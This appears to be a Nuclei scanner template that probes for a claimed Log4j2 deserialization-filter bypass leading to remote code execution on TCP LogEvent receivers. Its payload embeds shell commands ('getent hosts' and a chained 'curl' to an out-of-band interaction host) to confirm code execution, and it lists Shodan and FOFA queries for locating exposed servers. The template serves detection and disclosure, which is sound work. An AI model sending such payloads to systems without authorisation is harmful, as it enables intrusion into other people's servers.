id: log4j-4255-marshalledobject-rce

info:
  name: Apache Log4j2 2.11.0-2.26.1 - MarshalledObject Deserialization Filter Bypass to RCE
  author: redpatronus
  severity: critical
  description: |
    Apache Log4j2 2.11.0 through 2.26.1 allows deserialization filter bypass via java.rmi.MarshalledObject in the TCP socket LogEvent receiver. The allowlisted MarshalledObject wraps an inner stream that is deserialized without filtering, enabling RCE with standard Java gadget chains (e.g. commons-collections).
  impact: |
    Unauthenticated remote code execution on any Log4j2 TCP serialized-LogEvent receiver.
  remediation: |
    Upgrade to Log4j2 2.26.2 or later. Restrict access to TCP LogEvent receiver ports..
  reference:
    - https://github.com/apache/logging-log4j2/issues/4255
    - https://github.com/apache/logging-log4j2/discussions/4168
    - https://logging.apache.org/security/faq.html
  classification:
    cwe-id: CWE-502
  metadata:
    verified: true
    max-request: 1
    vendor: apache
    product: log4j
    shodan-query: port:"4712,4560" product:"Log4j"
    fofa-query: protocol="tcp" && banner="log4j"
  tags: log4j,log4j2,deserialization,rce,network,oast,java

variables:
  iurl: "{{interactsh-url}}"
  c1: "getent hosts "
  c2: ";curl -s http://"
  c3: "/ >/dev/null 2>&1;true #"
  prefix: ""
  suffix: ""

tcp:
  - inputs:
      - data: '{{hex_decode(prefix)}}{{c1}}{{interactsh-url}}{{c2}}{{interactsh-url}}{{c3}}{{repeat(" ", 200 - len(c1) - len(c2) - len(c3) - len(iurl) - len(iurl))}}{{hex_decode(suffix)}}'
    host:
      - "{{Hostname}}"
    read-size: 512
    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        name: dns-oob-rce
        words:
          - "dns"
      - type: word
        part: interactsh_protocol
        name: http-oob-rce
        words:
          - "http"

